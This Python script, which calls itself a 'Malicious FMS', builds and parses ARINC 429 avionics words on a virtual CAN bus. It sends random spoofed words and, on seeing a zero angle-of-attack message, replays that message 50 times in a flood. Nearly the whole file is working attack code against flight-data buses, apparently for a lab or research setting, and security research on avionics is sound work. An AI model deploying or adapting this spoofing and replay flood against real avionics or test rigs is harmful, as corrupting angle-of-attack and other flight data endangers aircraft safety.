import random
import can
import time
import threading

def compute_odd_parity(word_31bits: int) -> int:
    ones_total = bin(word_31bits).count('1')
    return 1 if ones_total % 2 == 0 else 0

def arinc429_receive(word: int) -> dict:
    parity = (word >> 31) & 0x1
    ssm = (word >> 29) & 0x3
    data = (word >> 10) & 0x7FFFF
    sdi = (word >> 8) & 0x3
    label = word & 0xFF
    return {
        "label": format(label, "08b"),
        "sdi": format(sdi, "02b"),
        "data": format(data, "019b"),
        "ssm": format(ssm, "02b"),
        "parity": format(parity, "1b")
    }

def arinc429_sender(label: int, sdi: int, data: int, ssm: int) -> int:
    word = (label & 0xFF)
    word |= (sdi & 0x3) << 8
    word |= (data & 0x7FFFF) << 10
    word |= (ssm & 0x3) << 29
    parity = compute_odd_parity(word)
    word |= (parity << 31)
    return word

def send_word(bus, word):
    data_bytes = word.to_bytes(4, byteorder='big')
    msg = can.Message(
        arbitration_id=0x100,
        data=data_bytes,
        is_extended_id=False
    )
    try:
        bus.send(msg)
        print("Message Sent From Malicious FMS!")
    except can.CanError:
        print("Message NOT sent!")

def generate_random_word(data_override=None):
    label = 0xFF
    sdi = 0b00
    data = random.randint(0, 0x7FFFF) if data_override is None else data_override
    ssm = random.randint(0, 0x3)
    return arinc429_sender(label, sdi, data, ssm)

def listening(bus):
    while True:
        message = bus.recv()
        if not message:
            continue
        word = int.from_bytes(message.data, byteorder='big')
        decoded = arinc429_receive(word)
        if decoded["label"] == "00000000" and decoded["data"] == "0000000000000000000":
            print("Received AoA zero message — starting replay flood...")
            for _ in range(50):  # flood 50 times
                send_word(bus, word)
                time.sleep(0.01)  # small delay to avoid blocking

def main():
    bus = can.interface.Bus(channel='vcan0', interface='socketcan')

    # start listening thread
    listener = threading.Thread(target=listening, args=(bus,), daemon=True)
    listener.start()

    # normal message sending
    for i in range(3):
        word = generate_random_word()
        send_word(bus, word)
        time.sleep(2)

    # keep alive so listener keeps running
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
